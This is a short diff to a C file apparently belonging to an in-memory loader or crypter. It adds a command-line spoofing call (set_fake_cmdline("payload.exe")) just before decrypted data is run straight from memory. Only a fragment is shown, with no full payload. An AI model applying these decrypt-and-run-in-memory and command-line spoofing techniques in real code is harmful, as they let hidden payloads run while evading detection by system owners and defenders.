@@ -1,9 +1,10 @@
 // core64.c
-// last updated: 18/01/2026 <d/m/y>
+// last updated: 19/01/2026 <d/m/y>
 #include "../c_header_files/core64.h"
 #include "../c_header_files/_compiler_based.h"
 #include "../c_header_files/outs.h"
 #include "../c_header_files/ram_mng.h"
+#include "../c_header_files/vfs_mng.h"
 void derive_key(const char *password, unsigned char *salt, unsigned char *key)
 {
     if (!password || strlen(password) == 0)
@@ -250,6 +251,7 @@ int decrypt_and_run(const char *input, const char *password)
         printf("[SUCCESS] Decryption successful (%d bytes)\n", plaintext_len);
     secure_zero(ciphertext, data_size);
     free(ciphertext);
+    set_fake_cmdline("payload.exe");
     int result = execute_from_memory(plaintext, plaintext_len);
     secure_zero(plaintext, plaintext_len);
     free(plaintext);
